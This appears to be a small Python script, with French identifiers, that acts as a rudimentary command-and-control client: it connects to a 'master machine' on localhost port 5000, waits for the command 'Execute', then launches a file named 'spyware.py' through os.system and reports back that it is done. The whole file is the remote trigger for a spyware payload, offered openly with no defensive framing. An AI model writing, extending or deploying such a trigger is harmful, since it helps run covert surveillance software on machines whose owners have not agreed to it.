import socket as modSocket
import os 

machine_maitre = (("localhost", 5000))

s = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)

def start_log(s):
    
    s.connect(machine_maitre)
    if s.recv(1024) == b"Execute":
        print("OK !!!")
        os.system("spyware.py")
    s.send("OK c'est fait !!!".encode("utf-8"))

start_log(s)
s.close()